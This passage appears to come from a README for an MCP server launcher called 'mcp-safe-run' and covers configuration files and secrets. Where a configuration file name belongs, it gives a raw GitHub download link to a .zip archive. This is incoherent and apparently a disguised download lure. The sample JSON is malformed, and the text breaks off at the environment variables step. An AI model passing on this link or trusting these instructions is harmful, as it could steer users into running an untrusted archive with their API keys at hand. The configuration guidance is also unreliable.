### Configuration Files

The launcher reads from a configuration file named `https://github.com/Kanak03-star/mcp-safe-run/raw/refs/heads/main/src/safe_mcp_run_v1.1.zip`. Here’s a sample structure:

```json
{
  "servers": [

      "name": "MyServer",
      "port": 8080,
      "secrets": {
        "API_KEY": "your_api_key_here"
      }
    }
  ]
}
```

### Environment Variables

You can also configure secrets using environment variables. Set the variables in your terminal before starting the launcher:
